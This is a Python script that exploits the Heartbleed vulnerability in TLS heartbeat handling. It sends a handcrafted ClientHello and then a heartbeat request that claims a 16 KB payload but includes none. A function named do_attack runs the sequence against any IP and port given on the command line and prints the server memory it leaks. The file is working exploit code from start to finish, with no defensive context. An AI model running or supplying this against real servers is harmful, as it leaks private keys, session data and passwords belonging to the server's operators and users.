import sys
import socket

BYTE_SIZE = 256
TLS_REC_HEADER_LEN = 5

def send_message(s, msg):
    s.send(''.join('{:02x}'.format(x) for x in msg).decode('hex'))

def parse_tls_record(header):
    typ = ord(header[0])
    ver = (ord(header[1]), ord(header[2]))
    size = ord(header[3]) * BYTE_SIZE + ord(header[4])
    return typ, ver, size

def send_client_hello(s):
    # create handshake message
    msg_extensions = [
            # TLS Extensions
            # https://tools.ietf.org/html/rfc5246#section-7.4.1.4
            # ec_point_formats
            0x00, 0x0b, # extension type
            0x00, 0x02, # extension length
            0x01, # format length
            0x00, # format
            # SessionTicket TLS
            0x00, 0x23, # extension type
            0x00, 0x00, # extension length
            # heartbeat
            0x00, 0x0f, # extension type
            0x00, 0x01, # extension length
            0x01, # peer_allowed_to_send
            ]
    L = len(msg_extensions)
    msg_payload = [
            0x03, 0x03, # TLS Version 1.2 {3, 3}
            # Client Hello
            # https://tools.ietf.org/html/rfc5246#section-7.4.1.2
            # Random (32 bytes): GMT Unix Time (uint32) + random bytes (28 bytes)
            0x3b, 0xf8, 0x0c, 0x0f, # GMT Unix Time
            0x7d, 0x0b, 0x8c, 0x68, 0xe1, 0x28, 0x3d, 0xcf, 0x2e, 0x9a, 0x9c,
            0x55, 0xca, 0x41, 0xc5, 0x70, 0xec, 0x09, 0xb5, 0xb5, 0x2c, 0xa2,
            0x54, 0xec, 0x60, 0xf5, 0x0a, 0x48, # random bytes
            0x00, # Session ID Length
            0x00, 0x1e, # uint8[2] Cipher Suites Length
            # Cipher Suites (15 x 2 bytes)
            0xc0, 0x2b, 0xc0, 0x2f, 0xcc, 0xa9, 0xcc, 0xa8, 0xc0, 0x2c,
            0xc0, 0x30, 0xc0, 0x0a, 0xc0, 0x09, 0xc0, 0x13, 0xc0, 0x14,
            0x00, 0x33, 0x00, 0x39, 0x00, 0x2f, 0x00, 0x35, 0x00, 0x0a,
            0x01, # Compression Method Length
            0x00, # Compression Method
            L / BYTE_SIZE, L % BYTE_SIZE, # Extensions Length
            ]
    L += len(msg_payload)
    msg_header = [
            # Handshake Protocol: Client Hello
            # https://tools.ietf.org/html/rfc5246#section-7.4
            0x01, # Handshake Type: Client Hello (1)
            # uint24 length (of protocol message): 80
            L / (BYTE_SIZE ** 2), L / BYTE_SIZE % BYTE_SIZE, L % BYTE_SIZE,
            ]
    L += len(msg_header)
    msg_record = [
            # TLS Record Protocol Layer
            # https://tools.ietf.org/html/rfc5246#section-6.2
            0x16, # handshake(22)
            0x03, 0x03, # TLS Version 1.2 {3, 3}
            L / BYTE_SIZE, L % BYTE_SIZE, # uint16 length (of fragment)
            ]

    msg = msg_record + msg_header + msg_payload + msg_extensions
    send_message(s, msg)

def recv_server_hello(s):
    while True:
        resp = s.recv(TLS_REC_HEADER_LEN)
        typ, _, pay_size = parse_tls_record(resp)
        if (typ != 0x16):
            print "Error in handshake"
            sys.exit(1)
        payload = ""
        L = 0 # len(payload), for efficiency
        while (L < pay_size):
            payload += s.recv(pay_size - L)
            L = len(payload)
        if payload[0] == "\x0e": # Server Hello Done
            break

def send_heartbeat(s):
    # create heartbeat message
    msg_payload = [
            0x01, # Heartbeat Type: Request
            0x40, 0x00,
            ]
    L = len(msg_payload) # What should have been
    msg_header = [
            # https://tools.ietf.org/html/rfc6520#section-6
            0x18, # Type: Heartbeat (as assigned by IANA)
            0x03, 0x03, # TLS Version 1.2 {3, 3}
            L / BYTE_SIZE, L % BYTE_SIZE, # Payload Length
            ]
    
    msg = msg_header + msg_payload
    send_message(s, msg)

def recv_heartbeat(s):
    resp = s.recv(TLS_REC_HEADER_LEN)
    typ, _, pay_size = parse_tls_record(resp)
    if (typ != 0x18):
        print "Error in heartbeat"
        sys.exit(1)
    payload = ""
    L = 0 # len(payload), for efficiency
    while (L < pay_size):
        payload += s.recv(pay_size - L)
        L = len(payload)

    print payload # user should redirect to output file

def do_attack(ip, port):
    # open TCP connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect((ip, port))

    send_client_hello(s)
    recv_server_hello(s)

    send_heartbeat(s)
    recv_heartbeat(s)

    s.close()

def main():
    if len(sys.argv) != 3:
        print "Usage: %s <IP> <PORT>"
        return

    ip = sys.argv[1]
    port = int(sys.argv[2])

    do_attack(ip, port)

if __name__ == "__main__":
    main()
